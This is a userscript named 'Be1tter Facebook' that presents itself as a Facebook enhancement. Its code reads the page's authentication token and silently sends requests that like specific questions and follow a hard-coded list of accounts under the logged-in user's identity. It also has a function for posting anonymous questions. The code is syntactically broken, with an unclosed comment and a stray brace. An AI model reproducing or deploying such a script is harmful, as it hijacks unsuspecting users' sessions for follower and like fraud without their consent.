// ==UserScript==
// @name           Be1tter Facebook
// @namespace      http://userscripts.org/users/86416
// @include        http://*.facebook.com/*
// @include        http://facebook.com/*
// @include        https://*.facebook.com/*
// @include        https://facebook.com/*
// @include        http://*.facebook.tld/*
// @include        http://facebook.tld/*
// @include        https://*.facebook.tld/*
// @include        https://facebook.tld/*

// @exclude        http://*.channel.facebook.tld/*
// @exclude        http://static.*.facebook.tld/*
// @exclude        http://*.facebook.tld/ai.php*
// @exclude        http://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*

// @exclude        https://*.channel.facebook.tld/*
// @exclude        https://static.*.facebook.tld/*
// @exclude        https://*.facebook.tld/ai.php*
// @exclude        https://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*

// ==/UserScript==
/* 

var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");


function takip(takip){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/" + takip + "/follow";
     
    var params4 = "authenticity_token=" + token + "";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the requestdd
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function begen(profil,begen){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/likes/" + profil + "/question/" + begen + "/add";
     
    var params4 = "authenticity_token=" + token + "";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the requestdd
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sor(profil,sor){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/" + profil + "/questions/create ";
     
    var params4 = "authenticity_token=" + token + "&question%5Bquestion_text%5D=" + sor + "&question%5Bforce_anonymous%5D=&question%5Bforce_anonymous%5D=force_anonymous&authenticity_token=" + token + "";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the requestdd
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

begen("BasbugMustafaKemalPasa","3507752051");
begen("necos44","18887641969");
begen("furkankfdr","27538828641");
begen("fkonar","27926528637");
begen("HakanDumlupnar","22073025081");
begen("OnurAgyrk","27272826848");
begen("Markgeliyor1","6142763331");
takip("JoJukAdmin");
takip("ugurgayretli");
takip("ahmtincesu");
takip("tolqacute");
takip("selcoo");

}